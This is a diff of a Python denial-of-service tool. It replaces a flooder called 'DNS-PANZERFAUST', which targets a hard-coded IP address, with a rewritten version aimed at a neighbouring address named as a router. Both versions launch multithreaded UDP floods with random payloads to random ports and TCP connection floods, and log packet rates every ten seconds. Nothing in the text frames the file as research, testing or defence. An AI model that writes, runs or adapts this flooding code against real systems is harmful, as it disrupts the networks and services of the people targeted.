@@ -1,92 +1,100 @@
 import socket
 import threading
-import random
 import time
+import random
 
-# ========== CONFIG ==========
-TARGET_IP = "62.109.121.42"  # CHANGE THIS
-UDP_THREADS = 15
-SYN_THREADS = 10
-PACKETS_SENT = [0]
-RUNNING = True
+router_ip = "62.109.121.43"
 
-# ========== PAYLOADS ==========
-def random_payload():
-    size = random.randint(64, 1450)
-    return bytes([random.randint(0, 255) for _ in range(size)])
+# Stats tracking
+stats = {
+    "udp_sent": 0,
+    "syn_sent": 0,
+    "udp_data": 0,
+    "syn_data": 0,
+    "udp_success": 0,
+    "syn_success": 0,
+    "udp_fail": 0,
+    "syn_fail": 0
+}
+stats_lock = threading.Lock()
 
-# ========== UDP FLOODER ==========
-def udp_attacker():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    while RUNNING:
-        batch_size = random.randint(125, 325)
-        for _ in range(batch_size):
-            try:
-                # Random source port simulation
-                sock.bind(('', random.randint(20000, 60000)))
-                # Random destination port
-                port = random.randint(1, 65535)
-                sock.sendto(random_payload(), (TARGET_IP, port))
-                PACKETS_SENT[0] += 1
-            except:
-                pass
-
-# ========== SYN FLOODER ==========
-def syn_attacker():
-    while RUNNING:
-        batch_size = random.randint(125, 325)
-        for _ in range(batch_size):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                sock.settimeout(0.001)
-                
-                # Random TTL, window size variation
-                sock.setsockopt(socket.SOL_IP, socket.IP_TTL, random.randint(32, 255))
-                
-                port = random.choice([80, 443, 53, 8080, 21, 22, 23, 7547])
-                sock.connect_ex((TARGET_IP, port))
-                PACKETS_SENT[0] += 1
-                sock.close()
-            except:
-                pass
-
-# ========== LOGGER ==========
-def logger():
-    last_count = 0
-    while RUNNING:
-        time.sleep(10)
-        current = PACKETS_SENT[0]
-        packets_in_10s = current - last_count
-        last_count = current
-        print(f"2M50:{packets_in_10s}")
-
-# ========== MAIN ==========
-print(f"DNS-PANZERFAUST targeting {TARGET_IP}")
-
-# Start UDP threads
-for _ in range(UDP_THREADS):
-    t = threading.Thread(target=udp_attacker)
-    t.daemon = True
-    t.start()
-
-# Start SYN threads
-for _ in range(SYN_THREADS):
-    t = threading.Thread(target=syn_attacker)
-    t.daemon = True
-    t.start()
-
-# Start logger
-log_thread = threading.Thread(target=logger)
-log_thread.daemon = True
-log_thread.start()
-
-# Keep alive
-try:
+# UDP Attack
+def udp_attack():
     while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    RUNNING = False
-    print("\nDNS-PANZERFAUST stopped.")
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            payload = random.randbytes(random.randint(500, 1450))
+            port = random.randint(1, 65535)
+            
+            sock.sendto(payload, (router_ip, port))
+            data_sent = len(payload)
+            
+            with stats_lock:
+                stats["udp_sent"] += 1
+                stats["udp_data"] += data_sent
+                stats["udp_success"] += 1
+            sock.close()
+            
+        except:
+            with stats_lock:
+                stats["udp_fail"] += 1
+
+# SYN Attack  
+def syn_attack():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.01)
+            port = random.randint(1, 65535)
+            
+            result = sock.connect_ex((router_ip, port))
+            with stats_lock:
+                stats["syn_sent"] += 1
+                stats["syn_data"] += 64  # Estimated SYN packet size
+                if result == 0:
+                    stats["syn_success"] += 1
+                else:
+                    stats["syn_fail"] += 1
+            sock.close()
+            
+        except:
+            with stats_lock:
+                stats["syn_fail"] += 1
+
+# Start 6 UDP threads
+for _ in range(6):
+    threading.Thread(target=udp_attack, daemon=True).start()
+
+# Start 4 SYN threads
+for _ in range(4):
+    threading.Thread(target=syn_attack, daemon=True).start()
+
+# Logging every 10s
+last_time = time.time()
+while True:
+    time.sleep(0.1)
+    current_time = time.time()
+    
+    if current_time - last_time >= 10:
+        with stats_lock:
+            total_sent = stats["udp_sent"] + stats["syn_sent"]
+            total_data = stats["udp_data"] + stats["syn_data"]
+            total_success = stats["udp_success"] + stats["syn_success"]
+            total_fail = stats["udp_fail"] + stats["syn_fail"]
+            
+            # Convert bytes to MB
+            data_mb = total_data / (1024 * 1024)
+            
+            print(f"2M50:{total_sent}:{data_mb:.2f}MB ---> ({total_success},{total_fail})")
+            
+            # Reset counters
+            stats["udp_sent"] = 0
+            stats["syn_sent"] = 0
+            stats["udp_data"] = 0
+            stats["syn_data"] = 0
+            stats["udp_success"] = 0
+            stats["syn_success"] = 0
+            stats["udp_fail"] = 0
+            stats["syn_fail"] = 0
+            
+        last_time = current_time
